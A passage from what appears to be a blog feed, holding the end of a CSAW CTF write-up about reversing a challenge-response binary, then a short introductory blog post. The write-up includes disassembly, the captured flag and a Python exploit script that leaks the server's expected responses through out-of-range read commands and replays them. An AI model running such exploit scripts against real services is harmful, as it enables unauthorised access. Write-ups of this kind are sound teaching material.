<li>the function cycles 8 times using the address pointed by ebp+var_4 as counter</li>
<li>at first it zeroes out EAX</li>
<li>then it moves the value from the memory location at address dword_804A0A0[eax*4 into EAX</li>
<li>and it multiplies EAX by EBP+var_8 (which is always 1)</li>
<li>at the end of the 8 iterations it returns the value in EAX</li>
</ul>


<p>So, considering that to get to read the flag, the only way to do that was for this function to return 1, that meant that EAX had to be 1 after the 8 cycles ended
At this point the only way, was to have dword_804A0A0[eax*4 to contain 1.</p>

<p>But wait, where did i see this address before? it looks familiar&hellip;</p>

<p>If we get back to the function that checks the response (the one accessed by sending \xeN) we notice that the memory location is exactly the same</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='c-objdump'><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048946</span>                 <span class="n">movzx</span>   <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_15</span><span class="p">]</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804894</span><span class="n">A</span>                 <span class="n">mov</span>     <span class="nl">ds</span><span class="p">:</span><span class="n">dword_804A0A0</span><span class="p">[</span><span class="n">eax</span><span class="o">*</span><span class="mi">4</span><span class="p">],</span> <span class="mi">1</span>   <span class="p">;</span> <span class="o">&lt;==</span> <span class="k">if</span> <span class="n">bytes</span> <span class="n">are</span> <span class="n">correct</span> <span class="n">this</span> <span class="n">memory</span> <span class="n">location</span> <span class="n">is</span> <span class="n">set</span> <span class="n">to</span> <span class="mi">1</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048955</span>                 <span class="n">leave</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048956</span>                 <span class="n">retn</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='c-objdump'><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048803</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_4</span><span class="p">]</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048806</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="nl">ds</span><span class="p">:</span><span class="n">dword_804A0A0</span><span class="p">[</span><span class="n">eax</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>  <span class="p">;</span> <span class="o">&lt;==</span> <span class="k">if</span> <span class="n">this</span> <span class="n">is</span> <span class="mi">1</span><span class="p">,</span> <span class="n">eax</span> <span class="n">is</span> <span class="mi">1</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804880</span><span class="n">D</span>                 <span class="n">mov</span>     <span class="n">edx</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_8</span><span class="p">]</span>
</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048810</span>                 <span class="n">imul</span>    <span class="n">eax</span><span class="p">,</span> <span class="n">edx</span>
</span></code></pre></td></tr></table></div></figure>


<p>In the end, the purpose of this function then, was to perform a further check and see if the <strong>whole</strong> response was correct.. wait, what? the WHOLE? (more on this later)</p>

<h2>How we saw the light at the end of the tunnel</h2>

<p>At this point everything was starting to make sense, but we were missing a point..
then all of a sudden we began to mumble about those 8 iterations</p>

<p><em>8 iterations.. 8 iterations&hellip; but what if?&hellip;</em></p>

<p>And that&rsquo;s how a simple guessing can lead to the solution, what if we needed to send 8 chunks of 4 bytes and build a whole response?
we thought, then that bitwise AND would make sense, we were able to get a total of 32 bytes of challenge from the server, maybe it&rsquo;s expecting us to send it 32 bytes, in chunk of 4.</p>

<p>we quickly tried that out by building a buffer that would at first pull 32 bytes of challenge 4 bytes at a time</p>

<pre><code>\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7
</code></pre>

<p>and then send the response with</p>

<pre><code>"\xe0" + &lt;the four bytes received from \xa0&gt; + "\xe1" + &lt;the 4 bytes received from \xa1&gt;.....*
</code></pre>

<p>and punched it to the server.. DAMN, no luck, it didn&rsquo;t work!
yet we were so close..</p>

<p>Then at a certain point, Barrebas, who was sitting silent working on reversing the binary said&hellip;</p>

<p><em>&ldquo;Wait.. the response is checked starting at a memory location that is 32 bytes away from where the challenge is read from&rdquo;</em></p>

<p>We saw the light! :D
we remembered that we could send commands from \xa0 to \xaf, which probably meant we could read past the 32 bytes of the challenge&hellip; what if we tried to verify with \xe0 the output from \xa8, and all the way onward to \xe7 with \xaf?</p>

<p>That would have probably sent the expected response to the server for each challenge request.. we tried and..
BAM! we got the flag!</p>

<pre><code># ./updated.py
CSAW ChallengeResponseAuthenticationProtocol Flag Storage

flag{greetings_to_pure_digital}
</code></pre>

<p>Here is the script we used as exploit to retrieve the flag from the server</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
</span><span class='line'>
</span><span class='line'><span class="n">target</span> <span class="o">=</span> <span class="s">&quot;54.85.89.65&quot;</span>
</span><span class='line'><span class="c">#target = &quot;127.0.0.1&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span> <span class="mi">8888</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>  <span class="c"># banner </span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\xa8\xa9\xaa\xab\xac\xad\xae\xaf</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">c0</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>        <span class="c"># challenge 0 </span>
</span><span class='line'><span class="n">c1</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>        <span class="c"># challenge 1 </span>
</span><span class='line'><span class="n">c2</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>        <span class="c"># challenge 2 </span>
</span><span class='line'><span class="n">c3</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>        <span class="c"># challenge 3 </span>
</span><span class='line'><span class="n">c4</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>        <span class="c"># challenge 4 </span>
</span><span class='line'><span class="n">c5</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>        <span class="c"># challenge 5 </span>
</span><span class='line'><span class="n">c6</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>        <span class="c"># challenge 6 </span>
</span><span class='line'><span class="n">c7</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>        <span class="c"># challenge 7 </span>
</span><span class='line'>
</span><span class='line'><span class="n">challenge</span> <span class="o">=</span> <span class="n">c0</span> <span class="o">+</span> <span class="n">c1</span> <span class="o">+</span> <span class="n">c2</span> <span class="o">+</span> <span class="n">c3</span> <span class="o">+</span> <span class="n">c4</span> <span class="o">+</span> <span class="n">c5</span> <span class="o">+</span> <span class="n">c6</span> <span class="o">+</span> <span class="n">c7</span>
</span><span class='line'>
</span><span class='line'><span class="n">buf</span> <span class="o">=</span> <span class="p">(</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\xe0</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">c0</span> <span class="o">+</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\xe1</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">c1</span> <span class="o">+</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\xe2</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">c2</span> <span class="o">+</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\xe3</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">c3</span> <span class="o">+</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\xe4</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">c4</span> <span class="o">+</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\xe5</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">c5</span> <span class="o">+</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\xe6</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">c6</span> <span class="o">+</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\xe7</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">c7</span> <span class="o">+</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\x80</span><span class="s">&quot;</span>
</span><span class='line'><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hello World]]></title>
    <link href="http://swappage.github.io/blog/2014/09/23/hello-world/"/>
    <updated>2014-09-23T21:20:47+02:00</updated>
    <id>http://swappage.github.io/blog/2014/09/23/hello-world</id>
    <content type="html"><![CDATA[<p>Hello there!</p>

<p>It looks like i made up my mind and started a blog!.</p>

<p><em>*lier*</em></p>

<p>Ok ok, you are right&hellip; the truth is that i started playing around with Markdown and octopress, and i wanted to try publishing something :)</p>

<p>What&rsquo;s going to be published here?</p>

<p>Well, pretty much everything that comes in my mind, things that i found interesting, reserches that I might be working on, games i play..</p>

<p>Oh right, I recently got an addiction for hacking games and competitions, so you will probably see some walkthroughs of challenges and problems from various CTF games..</p>

<p>mhh yep, pretty much it for now.
See you soon :)</p>
]]></content>
  </entry>
  
</feed>
